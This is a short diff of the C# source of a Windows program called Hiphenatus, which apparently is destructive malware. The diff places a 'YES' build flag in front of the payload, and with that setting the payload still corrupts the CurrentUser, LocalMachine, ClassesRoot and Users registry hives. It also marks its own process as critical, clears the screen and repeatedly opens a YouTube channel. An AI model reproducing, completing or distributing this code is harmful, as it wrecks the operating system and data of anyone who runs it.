@@ -15,7 +15,7 @@ namespace Hiphenatus
 {
     public partial class Form1 : Form
     {
-        int IS_THIS_BUILD_DESTRUCTIVE = 1;
+        public string IS_THIS_BUILD_DESTRUCTIVE = "YES";
 
         [DllImport("gdi32.dll")]
         private static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
@@ -362,7 +362,9 @@ namespace Hiphenatus
         public void execPayload()
         {
             DefineAsCritical();
-            Corrupt(Registry.CurrentUser);
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES") { 
+                Corrupt(Registry.CurrentUser);
+            }
 
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
 
@@ -380,7 +382,10 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            Corrupt(Registry.LocalMachine);
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            {
+                Corrupt(Registry.LocalMachine);
+            }
 
             Process.Start("https://www.youtube.com/@sudoUltimateQuack");
 
@@ -401,7 +406,10 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            Corrupt(Registry.ClassesRoot);
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            {
+                Corrupt(Registry.ClassesRoot);
+            }
 
             shader3Thread.Abort();
             bytebeat2.Abort();
@@ -417,7 +425,10 @@ namespace Hiphenatus
 
             ClearScreen();
 
-            Corrupt(Registry.Users);
+            if (IS_THIS_BUILD_DESTRUCTIVE == "YES")
+            {
+                Corrupt(Registry.Users);
+            }
 
             shader4Thread.Abort();
             bytebeat3.Abort();
